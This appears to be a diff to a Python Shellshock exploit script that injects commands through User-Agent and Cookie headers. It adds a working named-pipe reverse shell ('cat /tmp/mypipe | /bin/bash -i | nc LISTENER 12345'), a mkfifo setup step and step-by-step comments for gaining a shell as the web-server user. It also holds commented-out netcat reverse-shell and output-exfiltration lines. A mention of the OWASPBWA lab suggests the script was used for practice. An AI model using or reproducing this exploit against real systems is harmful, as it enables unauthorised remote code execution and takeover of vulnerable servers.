@@ -69,8 +69,20 @@ def getStatus(ourl):
 
 #The following variables are defined as headers for our POST request.
 
-    Command = "/bin/ping -c1 " + LISTENER
-    #Command = "/bin/nc " + LISTENER + " 4444 -e /bin/bash" #uncomment this line if you want to spawn a reverse netcat shell
+    #Command = "/bin/ping -c1 " + LISTENER 
+    #Command = "/bin/ls |& /bin/nc 172.16.24.1 12345" 
+
+# ===================================================================================================================
+
+    # To get a remote shell. You have to execute this script two times, the first one to create the pipe file (
+    # You have to make sure it was created, and that it was created with the user running the remote vulnerable script,
+    # which is generally 'www-data'), and the second one to obtain the remote shell.
+
+    #Command = "/usr/bin/mkfifo /tmp/mypipe"
+    Command = "/bin/cat /tmp/mypipe | /bin/bash -i 2>&1 | /bin/nc " + LISTENER + " 12345 > /tmp/mypipe" 
+
+# ==================================================================================================================
+
     #If testing against OWASPBWA, change nc to nc.traditional.  Thanks  Charley aka dotslashpwn 
     USER_AGENT = "() { :; }; " + Command
     Cookie = "() { :; }; " + Command
